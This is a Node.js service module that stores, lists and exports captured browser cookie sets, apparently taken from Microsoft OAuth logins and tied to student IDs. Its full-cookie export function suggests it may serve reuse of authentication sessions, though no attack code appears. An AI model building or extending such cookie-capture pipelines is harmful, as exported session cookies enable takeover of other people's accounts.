const CookieSession = require('../models/CookieSession');
const pino = require('pino');

const logger = pino({ name: 'cookieService' });

async function saveCookieSession(payload) {
    const doc = {
        sessionId: payload.sessionId,
        studentId: payload.studentId || null,
        source: payload.source || 'microsoft_oauth',
        phase: payload.phase,
        triggerUrl: payload.triggerUrl,
        domains: payload.domains || [],
        cookies: payload.cookies,
        cookieCount: payload.cookies.length,
        userAgent: payload.userAgent || null,
        metadata: payload.metadata || {},
        capturedAt: new Date()
    };

    const result = await CookieSession.findOneAndUpdate(
        { sessionId: payload.sessionId, phase: payload.phase },
        { $set: doc },
        { upsert: true, new: true, setDefaultsOnInsert: true }
    );

    logger.info({
        sessionId: payload.sessionId,
        phase: payload.phase,
        cookieCount: payload.cookies.length,
        studentId: payload.studentId || null
    }, 'Cookie session saved');

    return {
        sessionId: result.sessionId,
        phase: result.phase,
        cookieCount: result.cookieCount,
        capturedAt: result.capturedAt
    };
}

async function listCookieSessions(options) {
    const page = Math.max(1, Number(options.page) || 1);
    const limit = Math.min(100, Math.max(1, Number(options.limit) || 20));
    const skip = (page - 1) * limit;
    const filter = {};

    if (options.phase) filter.phase = options.phase;
    if (options.studentId) filter.studentId = options.studentId;

    const [items, total] = await Promise.all([
        CookieSession.find(filter)
            .sort({ capturedAt: -1 })
            .skip(skip)
            .limit(limit)
            .select('-cookies')
            .lean(),
        CookieSession.countDocuments(filter)
    ]);

    return { items, total, page, limit, pages: Math.ceil(total / limit) || 1 };
}

async function getCookieSessionById(id) {
    return CookieSession.findById(id).lean();
}

function buildCookieExport(session) {
    if (!session) return null;
    return {
        sessionId: session.sessionId,
        studentId: session.studentId,
        source: session.source,
        phase: session.phase,
        triggerUrl: session.triggerUrl,
        domains: session.domains,
        capturedAt: session.capturedAt,
        cookieCount: session.cookieCount,
        cookies: session.cookies || []
    };
}

module.exports = {
    saveCookieSession,
    listCookieSessions,
    getCookieSessionById,
    buildCookieExport
};
